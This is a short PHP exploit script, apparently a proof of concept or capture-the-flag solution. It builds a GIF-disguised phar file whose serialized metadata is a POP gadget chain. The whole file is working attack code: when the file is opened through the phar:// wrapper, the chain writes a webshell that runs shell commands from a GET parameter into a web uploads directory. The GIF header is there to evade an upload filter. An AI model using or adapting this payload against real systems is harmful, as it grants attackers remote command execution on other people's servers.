<?php
// Build a polyglot phar disguised as a GIF whose metadata is a POP chain:
//   Template{engine=Renderer{out, tpl}}
// On phar:// stat, Template::__destruct() -> Renderer::render() writes a webshell.
// Run with:  php -d phar.readonly=0 build_phar.php

class Renderer { public $out; public $tpl; }
class Template { public $engine; }

@unlink(__DIR__ . '/evil.phar');
$p = new Phar(__DIR__ . '/evil.phar');
$p->startBuffering();
$p->addFromString('x.txt', 'polyglot');
// GIF magic first so the upload's image filter passes; phar needs __HALT_COMPILER.
$p->setStub("GIF89a<?php __HALT_COMPILER(); ?>");

$r = new Renderer();
$r->out = '/var/www/html/uploads/sh.php';
$r->tpl = '<?php system($_GET["c"]); ?>';

$t = new Template();
$t->engine = $r;
$p->setMetadata($t);
$p->stopBuffering();

@unlink(__DIR__ . '/evil.gif');
rename(__DIR__ . '/evil.phar', __DIR__ . '/evil.gif');
echo "[+] wrote " . __DIR__ . "/evil.gif\n";
